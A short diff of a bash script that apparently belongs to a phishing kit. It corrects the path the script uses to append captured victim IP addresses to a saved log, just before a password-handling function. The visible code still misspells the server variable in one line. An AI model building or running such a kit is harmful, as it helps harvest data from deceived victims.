@@ -5,7 +5,7 @@ ip=$(grep -a 'IP:' site/$sever/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-cat ip.txt >> saved.ip.txt
+cat site/$server/ip.txt >> saved.ip.txt
 }
 
 password(){
